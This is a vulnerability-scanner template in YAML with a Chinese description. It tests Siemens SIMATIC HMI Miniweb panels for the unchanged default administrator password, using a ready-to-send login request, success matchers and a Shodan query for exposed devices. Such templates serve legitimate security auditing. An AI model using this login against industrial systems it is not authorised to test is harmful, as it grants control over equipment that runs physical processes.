id: siemens-simatic-default-login

info:
  name: Siemens SIMATIC HMI Miniweb 默认口令登录（弱口令）
  author: biero-el-corridor
  severity: high
  description: |
    该模板通过尝试 Siemens SIMATIC HMI Miniweb 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  metadata:
    max-request: 1
    verified: true
    shodan-query: title:"Miniweb Start Page"
  tags: ics,siemens,default-login,vuln

http:
  - raw:
      - |
        POST /FormLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Login=Administrator&Redirection=/Templates/Loginpage.html&Password=100

    matchers-condition: and
    matchers:
      - type: word
        part: response
        words:
          - 'siemens_ad_session='
          - 'Auth Form Response'
        condition: and

      - type: status
        status:
          - 200
